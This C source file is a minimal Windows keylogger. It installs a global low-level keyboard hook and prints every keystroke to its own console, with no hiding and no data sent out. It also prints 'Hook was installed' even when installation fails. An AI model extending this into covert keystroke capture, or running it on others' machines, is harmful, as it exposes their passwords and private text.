#include <stdio.h>
#include <windows.h>

// add this line or add user32.lib on Makefile
//#pragma comment(lib, "user32.lib")

/*
typedef struct tagKBDLLHOOKSTRUCT {
    DWORD     vkCode;       A virtual-key code. The code must be a value in the range 1 to 254.
    DWORD     scanCode;     A hardware scan code for the key.
    DWORD     flags;        The extended-key flag, event-injected flags, context code, and transition-state flag.
    DWORD     time;         The time stamp for this message, equivalent to what GetMessageTime would return for this message.
    ULONG_PTR dwExtraInfo;  Additional information associated with the message.
} KBDLLHOOKSTRUCT, *LPKBDLLHOOKSTRUCT, *PKBDLLHOOKSTRUCT;

https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
*/

LRESULT CALLBACK hook_proc(int code, WPARAM wParam, LPARAM lParam)
{
    KBDLLHOOKSTRUCT *pkey = (KBDLLHOOKSTRUCT *)lParam;
    if (wParam == WM_KEYDOWN)
    {
        switch(pkey->vkCode)
        {
            case VK_SPACE:
                printf("[SPACE]");
                break ;
            case VK_RETURN:
                printf("[ENTER]");
                break ;
            case VK_BACK:
                printf("[BACKSPACE]");
                break ;
            default:
                printf("%c", (char)pkey->vkCode);
                break ;
        }
    }

    return CallNextHookEx(NULL, code, wParam, lParam);
}

int main(void)
{
    HHOOK hhook = SetWindowsHookExA(
                            WH_KEYBOARD_LL,
                            hook_proc,
                            NULL,
                            0);

    if (!hhook)
        printf("Hook wasn't installed\n");
    printf("Hook was installed\n");

    MSG msg;
    while(GetMessage(&msg, NULL, 0, 0) != 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}